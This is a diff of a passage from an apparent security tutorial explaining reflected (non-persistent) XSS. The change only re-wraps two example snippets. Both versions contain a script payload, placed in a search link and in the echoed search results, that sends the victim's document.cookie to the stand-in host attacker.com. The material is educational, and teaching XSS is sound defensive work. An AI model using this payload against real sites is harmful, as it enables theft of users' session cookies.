@@ -39,13 +39,16 @@ More sophisticated scripts can be included from external sources:
 This is a non-persistent XSS attack where the target is tricked into clicking a link to a site that incorporates the malicious script. An example of this would be tricking a target to click on a search link:
 
 ```markup
-<a href=http://search.com/search?keyword=<script>window.location='http://attacker.com/?cookie=' + document.cookie</script>;>Click Here</a>
+<a href=http://search.com/search?keyword=<script>
+window.location='http://attacker.com/?cookie=' + 
+document.cookie</script>;>Click Here</a>
 ```
 
 The script would be executed when the search function prints the results:
 
 ```text
-You searched for: <script>window.location='http://attacker.com/?cookie=' + document.cookie</script>
+You searched for: <script>window.location='http://attacker.com/?cookie=' + 
+    document.cookie</script>
 Results: …
 ```
 
